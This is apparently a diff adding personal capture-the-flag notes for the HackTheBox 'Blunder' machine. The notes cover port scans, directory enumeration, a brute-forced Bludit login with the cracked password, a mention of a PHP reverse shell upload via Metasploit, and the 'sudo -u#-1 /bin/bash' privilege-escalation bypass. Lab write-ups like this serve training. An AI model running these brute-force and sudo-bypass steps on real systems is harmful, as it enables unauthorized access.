@@ -1,0 +1,93 @@
+---NMAP---
+PORT   STATE  SERVICE VERSION
+21/tcp closed ftp
+80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: Blunder
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Blunder | A blunder of interesting facts
+
+---MASSCAN---
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 80/tcp on 10.10.10.191
+
+/*
+it was someone that made this exploit
+---index.html analysis---
+FOUND A IMAGE THAT COULD NOT BE LOADED on the index.html
+trying to change the image source address to a local one
+uploading a image
+done
+nothing more could be achieved
+*/
+
+---directory enum---
+*gobuster dir -w /usr/share/wordlists/dirb/big.txt -u 10.10.10.191 -t 10
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/0 (Status: 200)
+/LICENSE (Status: 200)
+/about (Status: 200)
+/admin (Status: 301)
+/cgi-bin/ (Status: 301)
+/empty (Status: 200)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+/usb (Status: 200)
+*gobuster dir --url http://10.10.10.191/ -t 50  -w /usr/share/wordlists/dirb/common.txt -x php,txt -q
+/.htpasswd (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htpasswd.txt (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htaccess.txt (Status: 403)
+/.hta (Status: 403)
+/.hta.php (Status: 403)
+/.hta.txt (Status: 403)
+/0 (Status: 200)
+/about (Status: 200)
+/admin (Status: 301)
+/cgi-bin/ (Status: 301)
+/install.php (Status: 200)
+/LICENSE (Status: 200)
+/robots.txt (Status: 200)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+/todo.txt (Status: 200)
+
+
+---IN /todo.txt---
+CONTENT:
+	-Update the CMS
+	-Turn off FTP - DONE
+	-Remove old users - DONE
+	-Inform fergus that the new blog needs images - PENDING
+possible user found named fergus
+using a bruteforce attack from https://rastating.github.io/bludit-brute-force-mitigation-bypass/
+a lil bit modification on the python poc
+python3 poc.py
+*SUCCESS: Password found!
+*Use fergus:RolandDeschain to login.
+
+---LOGGED IN---
+trying to upload a php reverse shell
+using the msfconsole exploit
+done
+
+found hash pass on /var/www/bludit-3.10.0a/databases/users.php
+user flag accquired /home/hugo/user.txt
+
+---linpeas.sh---
+found a weird /ftp dir
+found a gzip with buzz.wav
+found a pdf file
+nothing interesting
+
+---hugo sudo -l---
+*sudo -l
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash
+
+using sudo 1.8.27 - Security Bypass
+*sudo -u#-1 /bin/bash
+privesc done
+cat /root/root.txt
